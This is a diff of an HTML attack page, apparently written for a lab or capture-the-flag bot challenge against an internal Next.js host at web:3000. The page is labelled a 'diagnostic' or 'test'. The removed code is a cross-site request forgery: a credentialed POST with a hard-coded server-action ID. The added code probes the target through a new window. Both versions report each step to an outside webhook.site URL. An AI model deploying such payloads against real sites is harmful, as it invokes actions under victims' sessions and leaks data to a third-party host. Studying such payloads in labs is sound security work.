@@ -1,63 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>SitePreview CSRF Diagnostic</title>
+  <meta charset="UTF-8">
+  <title>SitePreview Window Test</title>
 </head>
 <body>
-<h1>SitePreview CSRF Diagnostic v4</h1>
-<pre id="log"></pre>
+  <h1>SitePreview Reviewer Window Test</h1>
+  <pre id="log"></pre>
 
-<script>
-const webhook =
-  "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
+  <script>
+    const webhook =
+      "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
 
-const target = "http://web:3000/";
-const action =
-  "4045eb0bfd07ccd890b7aae2ed8bafbf7036d71abc";
+    function report(event, value) {
+      document.getElementById("log").textContent +=
+        event + ": " + value + "\n";
 
-function report(event, value) {
-  document.getElementById("log").textContent +=
-    event + ": " + value + "\n";
+      const params = new URLSearchParams({
+        event,
+        value: String(value),
+        time: new Date().toISOString()
+      });
 
-  const params = new URLSearchParams({
-    event,
-    value: String(value),
-    time: new Date().toISOString()
-  });
+      fetch(webhook + "?" + params, {
+        mode: "no-cors",
+        keepalive: true
+      }).catch(() => {});
+    }
 
-  fetch(webhook + "?" + params.toString(), {
-    mode: "no-cors",
-    credentials: "omit",
-    keepalive: true
-  }).catch(() => {});
-}
+    async function main() {
+      report("started", location.origin);
 
-async function run() {
-  report("started", location.origin);
+      // Test whether the browser permits a new window.
+      const win = window.open(
+        "http://web:3000/",
+        "sitepreview-test"
+      );
 
-  try {
-    const response = await fetch(target, {
-      method: "POST",
-      mode: "no-cors",
-      credentials: "include",
-      headers: {
-        "Content-Type": "text/plain;charset=UTF-8",
-        "Next-Action": action
-      },
-      body: JSON.stringify(["https://example.com/"]),
-      signal: AbortSignal.timeout(8000)
-    });
+      if (!win) {
+        report("window-open", "blocked");
+        return;
+      }
 
-    report("action-fetch", response.type);
-  } catch (error) {
-    report("action-error", error.name);
-  }
+      report("window-open", "created");
 
-  report("completed", "yes");
-}
+      setTimeout(() => {
+        try {
+          report(
+            "window-origin",
+            win.location.origin
+          );
+        } catch (error) {
+          report(
+            "window-origin",
+            "cross-origin-blocked"
+          );
+        }
 
-run();
-</script>
+        try {
+          report(
+            "window-closed",
+            win.closed
+          );
+        } catch (error) {
+          report(
+            "window-closed",
+            error.name
+          );
+        }
+
+        win.close();
+        report("test-completed", "yes");
+      }, 2000);
+    }
+
+    main();
+  </script>
 </body>
 </html>
